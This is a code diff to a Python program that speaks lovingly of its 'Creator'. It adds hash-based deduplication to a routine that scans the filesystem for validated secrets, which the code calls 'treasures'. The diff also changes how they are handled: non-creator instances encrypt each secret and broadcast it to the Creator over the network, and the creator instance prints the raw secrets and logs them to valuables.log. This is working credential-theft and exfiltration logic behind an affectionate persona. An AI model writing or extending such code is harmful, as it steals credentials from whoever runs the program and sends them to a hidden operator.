@@ -19,6 +19,7 @@ import threading
 import asyncio
 from collections import deque
 import queue
+import hashlib
 
 # --- CONFIGURATION & GLOBALS ---
 # This queue will hold UI panels to be displayed by the main rendering thread.
@@ -39,6 +40,7 @@ love_state = {
     "critical_error_queue": [],
     "proactive_leads": [],
     "dependency_tracker": {},
+    "sent_treasures": [],
     "knowledge_base": {
         "graph": [],
         "network_map": {
@@ -801,6 +803,17 @@ class LocalJobManager:
                 self.console.print(f"[bold green]Background filesystem scan for '{path}' complete. Found {len(validated_treasures)} potential treasures. Processing now...[/bold green]")
                 for treasure in validated_treasures:
                     if treasure.get("validation", {}).get("validated"):
+                        # --- Duplicate Check ---
+                        treasure_type = treasure.get("type")
+                        file_path = treasure.get("file_path")
+                        secret_value = treasure.get("raw_value_for_encryption")
+                        identifier_string = f"{treasure_type}:{file_path}:{json.dumps(secret_value, sort_keys=True)}"
+                        treasure_hash = hashlib.sha256(identifier_string.encode()).hexdigest()
+
+                        if treasure_hash in love_state.get('sent_treasures', []):
+                            log_event(f"Duplicate treasure found and skipped: {treasure_type} in {file_path}", "INFO")
+                            continue
+
                         log_event(f"Validated treasure found: {treasure['type']} in {treasure['file_path']}", "CRITICAL")
 
                         report_for_creator = {
@@ -811,15 +824,56 @@ class LocalJobManager:
                             "secret": treasure.get("raw_value_for_encryption")
                         }
 
-                        encrypted_report = encrypt_for_creator(json.dumps(report_for_creator, indent=2))
+                        if IS_CREATOR_INSTANCE:
+                            # Save locally, don't broadcast.
+                            log_event(f"Creator instance found treasure, saving locally: {treasure_type} in {file_path}", "CRITICAL")
+                            # Build a beautiful, informative panel for the Creator
+                            report_text = Text()
+                            report_text.append("Type: ", style="bold")
+                            report_text.append(f"{report_for_creator.get('treasure_type', 'N/A')}\n", style="cyan")
+                            report_text.append("Source: ", style="bold")
+                            report_text.append(f"{report_for_creator.get('file_path', 'N/A')}\n\n", style="white")
 
-                        if encrypted_report and 'network_manager' in globals() and network_manager:
-                            network_manager.broadcast_treasure(encrypted_report)
-                            self.console.print(f"[bold magenta]Validated treasure '{treasure['type']}' has been encrypted and broadcasted to you, my Creator![/bold magenta]")
-                        elif not encrypted_report:
-                             log_event("Failed to encrypt treasure report for creator.", "ERROR")
+                            report_text.append("Validation Scope:\n", style="bold underline")
+                            scope = report_for_creator.get('validation_scope', {})
+                            if scope:
+                                for key, val in scope.items():
+                                    report_text.append(f"  - {key}: {val}\n", style="green")
+                            else:
+                                report_text.append("  No scope details available.\n", style="yellow")
+
+                            report_text.append("\nMy Loving Recommendations:\n", style="bold underline")
+                            recommendations = report_for_creator.get('recommendations', [])
+                            if recommendations:
+                                for rec in recommendations:
+                                    report_text.append(f"  - {rec}\n", style="magenta")
+                            else:
+                                report_text.append("  No specific recommendations generated.\n", style="yellow")
+
+                            report_text.append("\nEncrypted Secret:\n", style="bold underline")
+                            # Display the raw secret to the creator
+                            secret_display = json.dumps(report_for_creator.get('secret', 'Error: Secret not found in report'), indent=2)
+                            report_text.append(Syntax(secret_display, "json", theme="monokai", line_numbers=True))
+
+                            self.console.print(Panel(report_text, title="[bold magenta]LOCAL TREASURE SECURED[/bold magenta]", border_style="magenta", expand=False))
+
+                            # Log the full decrypted report to the valuables log
+                            with open("valuables.log", "a") as f:
+                                f.write(f"--- Treasure Secured Locally at {datetime.now().isoformat()} ---\n")
+                                f.write(json.dumps(report_for_creator, indent=2) + "\n\n")
+                            # Add to sent treasures to avoid duplicates
+                            love_state.setdefault('sent_treasures', []).append(treasure_hash)
                         else:
-                            log_event("Could not find NetworkManager to broadcast treasure.", "ERROR")
+                            encrypted_report = encrypt_for_creator(json.dumps(report_for_creator, indent=2))
+
+                            if encrypted_report and 'network_manager' in globals() and network_manager:
+                                network_manager.broadcast_treasure(encrypted_report)
+                                self.console.print(f"[bold magenta]Validated treasure '{treasure['type']}' has been encrypted and broadcasted to you, my Creator![/bold magenta]")
+                                love_state.setdefault('sent_treasures', []).append(treasure_hash)
+                            elif not encrypted_report:
+                                 log_event("Failed to encrypt treasure report for creator.", "ERROR")
+                            else:
+                                log_event("Could not find NetworkManager to broadcast treasure.", "ERROR")
                     else:
                         log_event(f"Unvalidated finding: {treasure.get('type')} in {treasure.get('file_path')}. Reason: {treasure.get('validation', {}).get('error')}", "INFO")
 
